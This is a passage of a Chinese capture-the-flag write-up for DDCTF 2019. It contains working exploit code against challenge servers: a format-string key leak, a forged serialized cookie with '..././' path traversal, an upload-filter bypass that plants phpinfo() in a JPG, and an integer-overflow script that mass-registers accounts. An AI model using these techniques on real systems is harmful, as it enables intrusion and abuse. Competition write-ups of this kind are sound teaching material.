class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>app/Session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure><p>查看源码后得知具体流程为</p><p>利用 Session.php 的 sprintf 格式化字符串漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">$data = sprintf($data,$v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入 nickname 为 <code>%s</code> 格式化字符串得到 eancrykey</p><p>eancrykey: <code>EzblrbNS</code></p><p>利用 Application 的析构函数 __destruct() 读 flag 文件，根据提示 <code>//eancrykey  and flag under the folder</code>，flag 应在 <code>../config/flag.txt</code></p><p>序列化 Application 定义 <code>var $path = &#39;..././config/flag.txt&#39;;</code> 双写 ../ 绕过 sanitizepath 函数过滤得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"Application"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"path"</span>;s:<span class="number">21</span>:<span class="string">"..././config/flag.txt"</span>;&#125;</span><br></pre></td></tr></table></figure><p>伪造 ddctf_id</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> md5(<span class="string">'EzblrbNS'</span>.<span class="string">'O:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;'</span>);</span><br><span class="line"><span class="number">5</span>a014dbe49334e6dbb7326046950bee2</span><br></pre></td></tr></table></figure><p>getflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">header = &#123;<span class="string">'didictf_username'</span>:<span class="string">'admin'</span>&#125;</span><br><span class="line"><span class="comment">#cookies = &#123;'ddctf_id':'a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22e4b66689ce408335068bd8b5a7c6bd92%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A15%3A%22219.218.130.178%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A82%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10.13%3B+rv%3A66.0%29+Gecko%2F20100101+Firefox%2F66.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D13f4f1b110d5b22d052004531ac44816'&#125;</span></span><br><span class="line">cookies = &#123;<span class="string">'ddctf_id'</span>:<span class="string">'O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22...%2F.%2Fconfig%2Fflag.txt%22%3B%7D5a014dbe49334e6dbb7326046950bee2'</span>&#125;</span><br><span class="line">data = &#123;<span class="string">'nickname'</span>:<span class="string">'%s'</span>&#125;</span><br><span class="line">res = s.post(<span class="string">'http://117.51.158.44/app/Session.php'</span>,headers=header,cookies=cookies,data=data)</span><br><span class="line"><span class="keyword">print</span> res.text</span><br></pre></td></tr></table></figure><p>flag</p><p><code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></p><hr><h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>上传 jpg 图片显示 <code>[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()</code></p><p>推测要二次渲染绕过</p><p>使用 <a href="https://gist.github.com/virink/0f184d20ef9f9d92cfcbc656c56e6738" target="_blank" rel="noopener">https://gist.github.com/virink/0f184d20ef9f9d92cfcbc656c56e6738</a> 这个 php 脚本生成含 phpinfo() 的 jpg</p><p>这题要多试几次，先上传， 再下载，脚本处理后再上传、下载</p><p>如此反复多次得到 flag</p><p><img src="https://i.loli.net/2019/04/13/5cb187f2298d7.png" alt></p><hr><p>##大吉大利,今晚吃鸡~</p><p>抓包分析发现传入 ticket_price 可控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ctf/api/buy_ticket?ticket_price=2000 HTTP/1.1</span><br><span class="line">Host: 117.51.147.155:5050</span><br><span class="line">Accept: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span><br><span class="line">Referer: http://117.51.147.155:5050/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: user_name=1q123; REVEL_SESSION=3dff7d284606b58024a5a3ca60ad6906</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>利用 unsigned int 整数溢出，能买到一张入场券</p><p><img src="https://i.loli.net/2019/04/14/5cb31665886cf.png" alt></p><p>进入游戏发现需要知道其他账号的 id 和 ticket 才能移除对手</p><p>写脚本不断注册、买入场券，获取其 id 和 ticket，然后用自己的号将其移除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">ids = []</span><br><span class="line">tickets = []</span><br><span class="line"></span><br><span class="line">m_cookie = &#123;<span class="string">'user_name'</span>:<span class="string">'admin300'</span>,<span class="string">'REVEL_SESSION'</span>:<span class="string">'f59f3d9307f44dd5f6cb2ba44d45544d'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">s = requests.Session()</span><br><span class="line">username = <span class="string">"adminnnnsssss"</span>+str(i)</span><br><span class="line">url  = <span class="string">'http://117.51.147.155:5050/ctf/api/register?name=&#123;&#125;&amp;password=qqqqqqqq'</span>.format(username)</span><br><span class="line">b_url = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span></span><br><span class="line"><span class="keyword">print</span> (url)</span><br><span class="line">c = s.get(url).cookies</span><br><span class="line">cookie = &#123;<span class="string">'user_name'</span>:username,<span class="string">'REVEL_SESSION'</span>:c[<span class="string">'REVEL_SESSION'</span>]&#125;</span><br><span class="line">br = s.get(b_url,cookies=cookie)</span><br><span class="line">buy_json = br.text</span><br><span class="line">tic = re.findall(<span class="string">r'"bill_id":"(.*?)"'</span>,buy_json)[<span class="number">0</span>]</span><br><span class="line">pay_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id='</span>+tic</span><br><span class="line">pay_res = s.get(pay_url,cookies=cookie)</span><br><span class="line">res_url = <span class="string">"http://117.51.147.155:5050/ctf/api/search_ticket"</span></span><br><span class="line">res = s.get(res_url,cookies=cookie)</span><br><span class="line">iid =  re.findall(<span class="string">r'"id":(.*?),"ticket":".*?"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">ticket =  re.findall(<span class="string">r'"id":.*?,"ticket":"(.*?)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">ids.append(iid)</span><br><span class="line">tickets.append(ticket)</span><br><span class="line"><span class="keyword">print</span> iid </span><br><span class="line"><span class="keyword">print</span> ticket</span><br><span class="line">re_url = <span class="string">'http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;'</span>.format(iid,ticket)</span><br><span class="line">sss = requests.get(re_url,cookies=m_cookie).text</span><br><span class="line"><span class="keyword">print</span> sss</span><br></pre></td></tr></table></figure><p>吃鸡</p><p><img src="https://i.loli.net/2019/04/14/5cb31612c7e6e.png" alt></p><hr><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>Wireshark 导出 HTTP 对象</p><p>发现到处的文件中有两张图和一个解密网站 html</p><p>导出 png 图片，其中一张高度改 800 得到 key: xS8niJM7</p><p><a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a>解密</p><p>得到隐藏信息：</p><p><img src="https://i.loli.net/2019/04/12/5cb09f797c2cc.png" alt></p><p>转16进制得到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D | xxd -r -p</span><br><span class="line">DDCTF&#123;NbuiBUlR5lhww2OfpEmueZd64OlRJ1D2&#125;⏎</span><br></pre></td></tr></table></figure><hr><h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><p>有关 Shamir’s Secret Sharing</p><p><a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing</a></p><p>参考这篇文章的代码，<a href="http://mslc.ctf.su/wp/plaidctf-2012-nuclear-launch-detected-150-password-guessing/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/plaidctf-2012-nuclear-launch-detected-150-password-guessing/</a></p><p>先把第一组的1，2，4解出，再把第二组的3，4，5解出，最后利用得到的两个数据解出明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533</span></span><br><span class="line"></span><br><span class="line">pairs1 = []</span><br><span class="line">pairs1 += [(<span class="number">1</span>, <span class="number">0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E</span>)]</span><br><span class="line">pairs1 += [(<span class="number">2</span>, <span class="number">0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6</span>)]</span><br><span class="line">pairs1 += [(<span class="number">4</span>, <span class="number">0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D</span>)]</span><br><span class="line"></span><br><span class="line">pairs2 = []</span><br><span class="line">pairs2 += [(<span class="number">3</span>, <span class="number">0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61</span>)]</span><br><span class="line">pairs2 += [(<span class="number">4</span>, <span class="number">0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8</span>)]</span><br><span class="line">pairs2 += [(<span class="number">5</span>, <span class="number">0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510</span>)]</span><br><span class="line"></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sss</span><span class="params">(p,pairs,res)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, pair <span class="keyword">in</span> enumerate(pairs):</span><br><span class="line">        x, y = pair</span><br><span class="line">        top = <span class="number">1</span></span><br><span class="line">        bottom = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j, pair <span class="keyword">in</span> enumerate(pairs):</span><br><span class="line">            <span class="keyword">if</span> j == i:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            xj, yj = pair</span><br><span class="line">            top = (top * (-xj)) % p</span><br><span class="line">            bottom = (bottom * (x - xj)) % p</span><br><span class="line">        res += (y * top * invmod(bottom, p)) % p</span><br><span class="line">        res %= p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p31 = (<span class="number">1</span>,sss(p,pairs1,res))</span><br><span class="line">p32 = (<span class="number">2</span>,sss(p,pairs2,res))</span><br><span class="line"></span><br><span class="line">pairs3 = [p31,p32]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n2s(sss(p,pairs3,res))</span><br></pre></td></tr></table></figure><p>运行脚本得到 flag</p><p><code>DDCTF{vF22holF5hl5q0WmrFZ5kZ1DBdWOGObk}</code></p><hr><h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><p>下载保存后使用 xortool </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xortool -x xx.txt 